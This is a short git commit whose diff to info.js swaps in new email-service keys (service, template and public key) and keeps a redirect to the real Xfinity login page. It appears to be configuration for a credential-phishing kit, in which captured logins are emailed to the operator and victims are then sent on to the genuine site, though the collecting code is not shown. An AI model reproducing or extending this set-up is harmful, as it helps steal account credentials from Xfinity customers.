213d72939db2c6ee4d9632707ad1bc0a0345c06e
nakatalitymandemlly <jenniferkane992@gmail.com>
2026-09-19 05:22:17 -0700

    Update info.js

--- info.js
+++ info.js
@@ -4,7 +4,7 @@
  *
  * /**/
 
-const SERVICE_KEY = "service_cnuv1zq";
-const TEMPLATE_KEY =  "template_10z9ojp";
-const PUBLIC_KEY = "w50Qo5O6kJCt2XwfB";
+const SERVICE_KEY = "service_hf5pq8f";
+const TEMPLATE_KEY =  "template_sibydj8";
+const PUBLIC_KEY = "-fLV_FJeJ7vUjKiQn";
 const REDIRECT_URL = "https://login.xfinity.com/login?";
